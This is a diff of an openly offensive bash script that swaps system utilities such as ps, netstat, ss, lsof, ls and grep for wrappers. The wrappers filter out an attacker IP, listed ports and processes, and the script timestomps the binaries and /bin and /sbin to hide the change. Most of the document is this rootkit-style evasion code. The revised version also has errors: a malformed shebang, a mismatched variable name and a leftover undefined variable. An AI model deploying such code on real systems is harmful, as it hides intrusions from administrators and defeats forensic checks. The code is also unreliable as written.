@@ -1,58 +1,202 @@
-#!/bin/bash
+#!usr/bin/env bash
+#
+# Replace common defensive utilities with bash scripts that grep out the
+# strings we want to remain hidden. This includes our IP address, our port
+# numbers, and our secret processes.
 
-if [ $EUID -ne 0 ]; then
-	echo "[!] Must run as root"
-	exit 1
-fi
 
-get_timestamp () {
-	stat -L $1 | grep Modify | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "
-}
-
+#
 # *** Configurable variables ***
+#
+
 IP="10.10.2.4"
+COMMAND="ps top ss netstat lsof who w last cat ls grep egrep"
+
 IP_ESCAPED=$(echo "$IP" | sed "s/\./\\\./g") # escape the '.'s in the IP for use with egrep
-COMMANDS="ps top ss netstat lsof who w last cat ls grep egrep"
 PROCESSES="egrep|sleep|run-parts|cron\.hourly|/usr/sbin/CROND -n|gnano|nohup|setsid|wget|flock"
 PORTS="59000|59001|59002|59003|59004|59005|59006|59007|59008|59009|60000|60001|60002|60003|60004|60005|60006|60007|60008|60009"
 HIDE_ME="$IP_ESCAPED|$PROCESSES|$PORTS"
 
-# *** Main ***
+# Colors
+COLOR_OFF='\033[0m'
+BOLD_WHITE='\033[1;37m'
+RED='\033[0;31m'
+YELLOW='\033[0;33m'
+CYAN='\033[0;36m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+GREEN='\033[0;32m'
+
+
+#
+# *** Helper Functions ***
+#
+
+#######################################
+# Log colored and status-prefixed text to the terminal depending on the
+# user-provided log type.
+#
+# Globals:
+#   All above colors
+# Arguments:
+#   Log type, one of "task", "error", "warning", "info", "log", or "debug"
+#   Log message, the message to be printed to the terminal
+# Outputs:
+#   Colored and status-prefixed text otherwise, or usage on error
+# Returns:
+#   0 if cecho usage was correct, 1 otherwise
+########################################
+cecho() {
+	local cecho_usage="${RED}[!] cecho usage: cecho <task|error|warning|info|log|debug|done> <\"log_message\">${COLOR_OFF}"
+
+	if [ $# -ne 2 ]; then
+		echo -e "$cecho_usage"
+		return 1
+	fi
+
+	local log_type=$1
+	local log_message=$2
+
+	case $log_type in
+		"task")
+			echo
+			echo -e "${BOLD_WHITE}[+] --- ${log_message}${COLOR_OFF}"
+			;;
+		"error")
+			echo -e "${RED}[!] ${log_message}${COLOR_OFF}" >&2 # print to STDERR
+			;;
+		"warning")
+			echo -e "${YELLOW}[-] ${log_message}${COLOR_OFF}"
+			;;
+		"info")
+			echo -e "${CYAN}[*] ${log_message}${COLOR_OFF}"
+			;;
+		"log")
+			echo -e "${BLUE}[^] ${log_message}${COLOR_OFF}"
+			;;
+		"debug")
+			echo -e "${PURPLE}[?] ${log_message}${COLOR_OFF}"
+			;;
+		"done")
+			echo -e "${GREEN}[=] ${log_message}${COLOR_OFF}"
+			;;
+		*)
+			echo -e "$cecho_usage"
+			return 1
+			;;
+	esac
+}
+
+#######################################
+# Get a file's timestamp in YYYYMMDDhhmm format for use with "time -t".
+#
+# Globals:
+#   None
+# Arguments:
+#   The file path to retrieve the timestamp from
+# Outputs:
+#   Status or usage on error, otherwise nothing
+# Returns:
+#   0 if stat obtained file's timestamp, 1 otherwise
+########################################
+get_timestamp() {
+	if [ $# -ne 1 ]; then
+		cecho error "get_timestamp usage: get_timestamp <file>"
+		return 1
+	fi
+	
+	local file="$1"
+
+	if ! stat -L "$file" \
+		| grep "Modify" \
+		| cut -d " " -f 2,3 \
+		| cut -d ":" -f 1,2 \
+		| tr -d "-" \
+		| tr -d ":" \
+		| tr -d " "; then
+		cecho error "Couldn't stat '$file'"
+		return 1
+	fi
+}
+
+#######################################
+# Set a file's timestamp (a "timestomp").
+#
+# Globals:
+#   None
+# Arguments:
+#   The file path to set the timestamp on
+# Outputs:
+#   Status or usage on error, otherwise nothing
+# Returns:
+#   0 if file's timestamp was set, 1 otherwise
+########################################
+set_timestamp() {
+	if [ $# -ne 2 ]; then
+		cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
+		return 1
+	fi
+
+	local timestamp="$1"
+	local file="$2"
+
+	if ! touch -t "$timestamp" "$file"; then
+		cecho error "Couldn't modify timestamp for '$file'"
+		return 1
+	else
+		cecho info "Modified timestamp for '$file'"
+	fi
+}
+
+
+#
+# *** Root check ***
+#
+
+if [ $EUID -ne 0 ]; then
+	cecho error "Must run as root"
+	exit 1
+fi
+
+
+#
+# --- Main ---
+#
+
+cecho task "Replacing binaries with scripts that hide our evil doings"
+
 bin_timestamp=$(get_timestamp /bin)
 sbin_timestamp=$(get_timestamp /sbin)
 
-for process in $COMMANDS; do
-	if $(which $process); then
-		process_path=$(which $process)
+for command in $COMMANDS; do
+	if which "$command"; then
+		command_path=$(which $command)
 
-		if [ -f "/bin/bak${process}" ]; then
-			echo "[-] Binary '$process' has already been hijacked, skipping"
+		if [ -f "/bin/bak${command}" ]; then
+			cecho log "Binary '$command' has already been hijacked, skipping"
 		else
-			process_timestamp=$(get_timestamp "$process_path")
-			if [ ! cp "$process_path" "/bin/bak${process}" ]; then
-				echo "[!] Could not copy '$process_path' to '/bin/bak${process}', aborting"
+			command_timestamp=$(get_timestamp "$command_path")
+			if ! cp "$command_path" "/bin/bak${process}"; then
+				cecho error "Could not copy '$command_path' to '/bin/bak${command}', aborting"
 			else
-				if [ ! echo "/bin/bak${process} \$@ | egrep -v \"$HIDE_ME\"" > "$process_path" ]; then
-					echo "[!] Could not write to '$process_path', restoring original binary..."
-					mv "/bin/bak${process}" "$process_path"
-					touch -t $process_timestamp "$process_path"
+				if ! echo "/bin/bak${process} \$@ | egrep -v \"$HIDE_ME\"" > "$command_path"; then
+					cecho error "Could not write to '$command_path', restoring original binary..."
+					mv "/bin/bak${process}" "$command_path" || cecho error "Could not restore original binary '$command_path'"
+					touch -t $command_timestamp "$command_path"
 				else
-					chmod 755 "$process_path"
-					touch -t $process_timestamp "$process_path"
-					echo "[*] Hijacked binary '$process_path'"
+					cecho info "Replaced binary at '$command_path'"
+					chmod 755 "$command_path" || cecho error "Could not chmod '$command_path'"
+					touch -t $command_timestamp "$command_path"
 				fi
 			fi
 		fi
 	else
-		echo "[-] Binary '$process' doesn't exist, skipping"
+		cecho warning "Binary '$command' doesn't exist, skipping"
 	fi
 done
 
 touch -t $bin_timestamp "/bin"
 touch -t $sbin_timestamp "/sbin"
+cecho info "Restored '/bin' and '/sbin' timestamps"
 
-echo
-echo "[+] Restored '/bin' and '/sbin' timestamps"
-
-echo
-echo "[+] Done!"
+cecho done "Done replacing binaries!"
